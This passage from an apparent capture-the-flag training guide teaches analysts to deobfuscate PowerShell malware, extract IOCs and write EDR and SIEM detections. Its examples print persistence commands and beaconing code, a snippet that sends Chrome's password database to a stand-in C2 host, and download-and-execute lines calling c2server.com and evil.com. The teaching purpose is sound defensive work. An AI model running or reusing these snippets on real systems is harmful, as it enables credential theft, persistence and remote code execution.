svchost.ps1  (mimicking legitimate svchost.exe)
system_update.ps1
WindowsUpdate.ps1
```

**File hashes:**
```
MD5: a3f8c71e9d4b2a1c8e5f6d7a8b9c0e1f
SHA256: 7f9e8d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8
```

#### 3. Registry IOCs

**Persistence keys:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Value names:**
```
WindowsSecurityUpdate
SystemUpdate
ChromeUpdate
AdobeUpdate
```

**Value data:**
```
powershell.exe -WindowStyle Hidden -File C:\Users\...\malware.ps1
cmd.exe /c start /min powershell.exe -ep bypass -file C:\...\script.ps1
```

#### 4. Behavioral IOCs

**Process activity:**
```
- WINWORD.EXE spawning powershell.exe
- powershell.exe with -EncodedCommand
- powershell.exe with -WindowStyle Hidden
- powershell.exe accessing browser credential stores
```

**Network connections:**
```
- Outbound HTTP on non-standard ports (8080, 8443, 9001)
- DNS queries to suspicious domains
- Failed TLS/SSL certificate validations
- Beaconing behavior (regular intervals)
```

**File access:**
```
- Reading browser credential databases
- Accessing password files
- Enumerating user directories
- Copying files to Temp or AppData
```

---

## Windows Persistence Mechanisms

### Why Persistence?

Attackers establish persistence to:
- Survive system reboots
- Maintain access after initial compromise
- Ensure malware runs automatically
- Avoid having to re-exploit the system

### Common Persistence Techniques

#### 1. Registry Run Keys

**Most common persistence method:**

```powershell
# Current User (HKCU) - doesn't require admin privileges
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "WindowsSecurityUpdate" `
                 -Value "powershell.exe -WindowStyle Hidden -File C:\Users\victim\AppData\Roaming\malware.ps1"

# Local Machine (HKLM) - requires admin privileges
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "SystemUpdate" `
                 -Value "C:\Windows\System32\malware.exe"
```

**Why attackers love it:**
- Executes on every user login
- Easy to implement
- Works without admin rights (HKCU)
- Survives reboots

**How to detect:**
```powershell
# Check Run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Look for suspicious entries:
- PowerShell scripts in AppData
- Hidden window styles
- Execution policy bypasses
- Unusual paths or file names
```

#### 2. Scheduled Tasks

**PowerShell task creation:**
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger
```

**Why attackers use it:**
- Can run with SYSTEM privileges
- Flexible scheduling (logon, startup, periodic)
- Harder to spot than Run keys

**How to detect:**
```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}
```

#### 3. Startup Folder

**Placing files in startup:**
```powershell
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item "malware.ps1" -Destination "$startupPath\system_update.ps1"
```

**How to detect:**
```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

#### 4. WMI Event Subscriptions

**Advanced persistence:**
```powershell
# Create WMI event that triggers on Windows start
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

**Why it's dangerous:**
- Very stealthy
- Survives most cleanup efforts
- Requires specialized tools to detect

---

## Command-and-Control (C2) Communication

### What is C2?

Command-and-Control infrastructure allows attackers to:
- Send commands to compromised systems
- Receive data from infected machines
- Update malware remotely
- Coordinate multi-system attacks

### C2 Communication Patterns

#### 1. HTTP/HTTPS Beaconing

**Example from malware:**
```powershell
# Beacon to C2 server
$c2_url = "http://frostnet-updates.northpole-cloud.net:8080/checkin"
$beacon_data = "checkin=$env:COMPUTERNAME&user=$env:USERNAME"
Invoke-WebRequest -Uri $c2_url -Method POST -Body $beacon_data -UseBasicParsing
```

**Beacon characteristics:**
- **Regular intervals** - Every X minutes/hours
- **Unique identifiers** - Computer name, user name, unique ID
- **Small payloads** - Just checking in
- **HTTP POST** - Sending system info to attacker

#### 2. Data Exfiltration

**Example credential theft:**
```powershell
# Steal Chrome passwords
$chrome_db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($chrome_db))
Invoke-WebRequest -Uri "http://c2server.com/exfil" -Method POST -Body $data
```

**Exfiltration methods:**
- **HTTP POST** - Most common, easy to implement
- **DNS tunneling** - Hiding data in DNS queries
- **HTTPS** - Encrypted exfiltration
- **Cloud storage** - Upload to Dropbox, Google Drive, OneDrive

#### 3. Command Execution

**Receiving commands from C2:**
```powershell
# Download and execute commands from C2
$commands = (Invoke-WebRequest -Uri "http://c2server.com/cmd").Content
Invoke-Expression $commands
```

**Why this is dangerous:**
- Attacker can run any command
- Commands can be updated remotely
- Malware becomes a remote administration tool

### C2 Infrastructure

**Attacker infrastructure components:**

```
                    [Attacker]
                        |
                        ↓
                [C2 Server: 203.0.113.99]
            (frostnet-updates.northpole-cloud.net)
                        |
        ┌───────────────┼───────────────┐
        ↓               ↓               ↓
   [Victim 1]      [Victim 2]      [Victim 3]
  ELFWORK-47      ELFWORK-52      ELFWORK-61
```

**Infrastructure patterns:**
- **Multiple domains** pointing to same IP
- **Dynamic DNS** - Frequently changing IPs
- **Bulletproof hosting** - Hosting in countries with lax laws
- **Domain generation algorithms (DGA)** - Generating new domains daily
- **Fast flux** - Rapidly changing DNS records

---

## EDR Detection Capabilities

### What is EDR?

Endpoint Detection and Response (EDR) systems monitor endpoints for malicious activity by:
- Observing process behavior
- Monitoring network connections
- Tracking file system changes
- Analyzing registry modifications
- Detecting anomalous activity

### How EDR Detects PowerShell Malware

#### 1. Process Tree Analysis

**Suspicious parent-child relationships:**
```
WINWORD.EXE (PID 4892)
  └─ powershell.exe (PID 7241)  ← SUSPICIOUS!
      - Word shouldn't spawn PowerShell normally

OUTLOOK.EXE (PID 3412)
  └─ powershell.exe (PID 8891)  ← SUSPICIOUS!
      - Outlook shouldn't spawn PowerShell normally

explorer.exe (PID 1234)
  └─ powershell.exe (PID 5678)  ← Maybe legitimate
      - User might have right-clicked → "Run with PowerShell"
```

**Why this matters:**
- Office applications spawning PowerShell = likely macro malware
- Email clients spawning PowerShell = possible phishing attachment
- Legitimate admin scripts usually run from scheduled tasks or direct execution

#### 2. Command-Line Analysis

**Suspicious command-line patterns:**

```powershell
# Hidden window style
powershell.exe -WindowStyle Hidden -File malware.ps1
                ← EDR flags this

# Encoded commands
powershell.exe -EncodedCommand SW52b2tlLVdlYlJlcXVlc3Q=
                ← EDR flags this

# Execution policy bypass
powershell.exe -ExecutionPolicy Bypass -File script.ps1
                ← EDR flags this

# Download and execute in memory
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
                         ← EDR DEFINITELY flags this
```

**Red flags for EDR:**
- `-WindowStyle Hidden` - Trying to hide from user
- `-EncodedCommand` - Obfuscated payload
- `-ExecutionPolicy Bypass` - Circumventing security
- `Invoke-Expression` (IEX) - Executing arbitrary code
- `New-Object Net.WebClient` - Downloading content
- `.DownloadString` - Fileless execution

#### 3. Network Behavior

**Suspicious network activity:**

```
PowerShell making outbound connections:
- To non-whitelisted domains
- On non-standard ports (8080, 4444, etc.)
- With POST requests containing system information
- To IP addresses instead of domains
- With beaconing patterns (regular intervals)
```

**EDR alert example:**
```json
{
  "type": "NETWORK_CONNECTION",
  "process": "powershell.exe",
  "destination": "203.0.113.99:8080",
  "domain": "frostnet-updates.northpole-cloud.net",
  "blocked": true,
  "reason": "Domain not in whitelist, suspicious TLD pattern"
}
```

#### 4. File System Activity

**Suspicious file operations:**

```powershell
# Copying itself to startup locations
Copy-Item $PSCommandPath -Destination "$env:APPDATA\svchost.ps1"
                                                      ← Mimicking legitimate process name

# Accessing credential stores
$chrome_db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Get-Content $chrome_db
             ← Unauthorized access to credential storage
```

**EDR detects:**
- Copying scripts to `AppData\Roaming`
- Files named after system processes (`svchost.ps1`, `system32.ps1`)
- Access to browser credential databases
- Reading sensitive user files

#### 5. Registry Modifications

**Persistence attempts:**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "WindowsSecurityUpdate" `
                 -Value "powershell.exe -WindowStyle Hidden -File C:\Users\victim\AppData\Roaming\svchost.ps1"
```

**EDR flags:**
- New Run key entries
- Suspicious value names (mimicking legitimate updates)
- PowerShell in the value data
- Hidden window styles
- Scripts in user AppData folders

---

## Practical Analysis Tools

### 1. Text Editors

**Recommended editors:**

**Visual Studio Code**
- Free and open-source
- Syntax highlighting for PowerShell
- Extensions for analysis
- Safe environment (no accidental execution)

**Notepad++**
- Lightweight and fast
- Syntax highlighting
- Find/Replace with regex
- Compare plugin for before/after analysis

**Sublime Text**
- Fast and responsive
- Multiple cursors (useful for pattern editing)
- Powerful search and replace

### 2. CyberChef

**The Swiss Army Knife of encoding/decoding:**

**URL:** https://gchq.github.io/CyberChef/

**Common operations for PowerShell analysis:**
- **From Base64** - Decode base64 strings
- **Reverse** - Reverse backwards strings
- **Find / Replace** - Character substitution
- **From Hex** - Decode hex-encoded strings
- **URL Decode** - Decode URL-encoded strings
- **Regular Expression** - Extract patterns (IPs, domains, URLs)

**Example recipe for multi-layer obfuscation:**
```
1. From Base64
2. Reverse
3. Find/Replace (multiple operations)
4. Extract IPs
```

### 3. PowerShell (Safe Mode)

**Safe decoding commands:**

```powershell
# Base64 decode (UTF-8)
$encoded = "dGVzdA=="
$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded

# Base64 decode (UTF-16LE / Unicode - for -EncodedCommand)
$encoded = "dABlAHMAdAA="
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
Write-Output $decoded

# String reversal
$reversed = "backwards"
$chars = $reversed.ToCharArray()
[array]::Reverse($chars)
$original = -join $chars
Write-Output $original

# Hex decode
$hex = "48656C6C6F"
$bytes = [byte[]] -split ($hex -replace '..', '0x$& ')
$decoded = [System.Text.Encoding]::ASCII.GetString($bytes)
Write-Output $decoded
```

**Remember:**
- Always use `Write-Output`, `Write-Host`, or `echo`
- NEVER use `Invoke-Expression`, `IEX`, `&`, or `.`
- Work with small snippets
- Type commands manually, don't copy-paste entire scripts

### 4. Online Tools

**Base64 Decoder:**
- https://www.base64decode.org/

**String Reverser:**
- https://www.textreverse.com/

**Regex Testing:**
- https://regex101.com/ (for extracting patterns)

**URL Decoder:**
- https://www.urldecoder.org/

### 5. Threat Intelligence Platforms

**Check IOCs against known threats:**

**VirusTotal** (https://www.virustotal.com/)
- Submit file hashes
- Check domains and IPs
- See community detections

**AbuseIPDB** (https://www.abuseipdb.com/)
- Check IP reputation
- Report malicious IPs
- See abuse history

**URLhaus** (https://urlhaus.abuse.ch/)
- Malware distribution URL database
- Check suspicious URLs

**AlienVault OTX** (https://otx.alienvault.com/)
- Threat intelligence sharing
- IOC lookups
- Campaign tracking

---

## Best Practices

### Analysis Best Practices

#### 1. Document Everything

**Create an analysis report:**

```markdown
## Malware Analysis Report

**Sample:** system_update.ps1
**Hash (MD5):** a3f8c71e9d4b2a1c8e5f6d7a8b9c0e1f
**Hash (SHA256):** 7f9e8d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8
**Analysis Date:** 2024-12-16
**Analyst:** [Your Name]

### Summary
[Brief overview of malware capabilities]

### Obfuscation Layers
1. Base64 encoding
2. String reversal
3. Character replacement

### Indicators of Compromise

**Network IOCs:**
- C2 Domain: frostnet-updates.northpole-cloud.net
- C2 IP: 203.0.113.99
- C2 Port: 8080
- Protocol: HTTP

**File IOCs:**
- Target Location: C:\Users\[user]\AppData\Roaming\svchost.ps1
- File Name: svchost.ps1 (mimicking legitimate process)

**Registry IOCs:**
- Key Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Value Name: WindowsSecurityUpdate
- Value Data: powershell.exe -WindowStyle Hidden -File [malware path]

**Behavioral IOCs:**
- Process: WINWORD.EXE → powershell.exe (suspicious parent)
- Network: Outbound HTTP POST to C2
- File Access: Chrome Login Data (credential theft)
- Registry: Persistence via Run key

### Deobfuscation Steps
[Detail your methodology]

### Recommendations
[Remediation and detection recommendations]
```

#### 2. Use Version Control

**Track your analysis:**
```bash
# Create analysis directory
mkdir malware_analysis_20241216
cd malware_analysis_20241216

# Initialize git repo
git init

# Add files
git add system_update.ps1 analysis_notes.md

# Commit progress
git commit -m "Initial analysis: identified base64 encoding"
git commit -m "Decoded C2 domain: frostnet-updates.northpole-cloud.net"
```

#### 3. Work Layer by Layer

**Don't try to deobfuscate everything at once:**
```
✓ Good approach:
1. Decode $x1b9 (base64) → Result: "ten.duolc-elophron..."
2. Reverse the result → Result: "northpole-cloud.net..."
3. Document finding
4. Move to next variable $c7y

✗ Bad approach:
- Try to understand everything simultaneously
- Get overwhelmed
- Miss important details
```

#### 4. Validate Findings

**Cross-reference your deobfuscated IOCs:**
```
Deobfuscated C2 domain: frostnet-updates.northpole-cloud.net
EDR alert shows: frostnet-updates.northpole-cloud.net
✓ MATCH - Deobfuscation successful!

Deobfuscated IP: 203.0.113.99
EDR alert shows: 203.0.113.99
✓ MATCH - Deobfuscation validated!
```

#### 5. Build a Reference Library

**Collect obfuscation patterns:**
```powershell
# Pattern: Base64 + Reverse
$encoded = [Convert]::FromBase64String($var)
$decoded = [Text.Encoding]::UTF8.GetString($encoded)
$arr = $decoded.ToCharArray()
[array]::Reverse($arr)
$final = -join $arr

# Pattern: String concatenation for commands
$a = "Invo"; $b = "ke-W"; $c = "ebRe"; $d = "quest"
$cmd = $a + $b + $c + $d
```

### Detection and Prevention

#### For Defenders

**1. EDR Configuration:**
- Monitor Office applications spawning PowerShell
- Alert on `-EncodedCommand` usage
- Block `-WindowStyle Hidden` in non-admin contexts
- Flag execution policy bypasses

**2. PowerShell Logging:**
```powershell
# Enable Script Block Logging
# Logs all PowerShell commands executed

# Enable Module Logging
# Logs PowerShell module usage

# Enable Transcription
# Creates full session logs
```

**3. Application Whitelisting:**
- Allow only approved scripts to run
- Use AppLocker or Windows Defender Application Control
- Restrict PowerShell execution to IT staff

**4. Network Monitoring:**
- Whitelist known-good domains
- Alert on PowerShell making outbound connections
- Block non-standard ports for HTTP/HTTPS (8080, 8443, etc.)

**5. User Training:**
- Don't enable macros in Office documents
- Don't run unknown PowerShell scripts
- Report suspicious emails
- Verify sender legitimacy

#### For Analysts

**1. Build Detection Rules:**
```yaml
# Example SIEM rule
title: Suspicious PowerShell Execution from Office Application
description: Detects Office applications spawning PowerShell with suspicious parameters
detection:
  condition: parent_process IN (WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE)
             AND process = powershell.exe
             AND (command_line CONTAINS "-EncodedCommand"
                  OR command_line CONTAINS "-WindowStyle Hidden"
                  OR command_line CONTAINS "Invoke-Expression"
                  OR command_line CONTAINS "DownloadString")
```

**2. Create IOC Feeds:**
- Share discovered IOCs with team
- Submit to threat intelligence platforms
- Update firewall/IDS rules
- Block malicious infrastructure

**3. Hunt Proactively:**
```powershell
# Search for persistence mechanisms
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" |
    Where-Object {$_.PSObject.Properties.Value -like "*powershell*"}

# Find suspicious PowerShell executions
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Message -like "*-EncodedCommand*"}
```

---

## Summary

**Key Takeaways:**

1. **PowerShell is powerful** - Makes it attractive to both defenders and attackers
2. **Obfuscation is multi-layered** - Work through it systematically
3. **Static analysis is safe** - Never execute unknown code
4. **Document everything** - Your analysis helps others detect similar threats
5. **Use the right tools** - CyberChef, text editors, safe PowerShell
6. **Validate findings** - Cross-reference with EDR/logs
7. **Share IOCs** - Help the community defend against threats

**Analysis Workflow Summary:**

```
1. Triage → Identify obfuscation patterns
2. Plan → Map encoding layers
3. Decode → Work through each layer (base64, reversal, replacement)
4. Extract → Document all IOCs (domains, IPs, paths, keys)
5. Validate → Cross-check with EDR/behavioral data
6. Report → Share findings and recommendations
```

**Remember:**
- ✅ Decode safely using `Write-Output`
- ✅ Work layer by layer
- ✅ Document your findings
- ✅ Validate against behavioral data
- ❌ NEVER execute unknown scripts
- ❌ NEVER use `Invoke-Expression` on malware
- ❌ NEVER run in production environments

---

## Additional Resources

**Microsoft Documentation:**
- PowerShell Security Best Practices
- PowerShell Logging Configuration
- Execution Policy Documentation

**MITRE ATT&CK:**
- T1059.001 - PowerShell
- T1027 - Obfuscated Files or Information
- T1547.001 - Registry Run Keys / Startup Folder

**Analysis Blogs:**
- SANS Internet Storm Center - PowerShell Analysis
- Mandiant Blog - PowerShell Attacks
- CrowdStrike Blog - PowerShell Obfuscation

**Training:**
- SANS FOR500 - Windows Forensic Analysis
- SANS FOR610 - Reverse-Engineering Malware
- Offensive Security - PowerShell for Pentesters

---

*"The best defense is understanding the attack. Master deobfuscation, and no malware can hide from you."*

**Ready for the challenge?** Extract the password from Day 4's flag, unlock the Day 5 artifacts, and start your analysis!
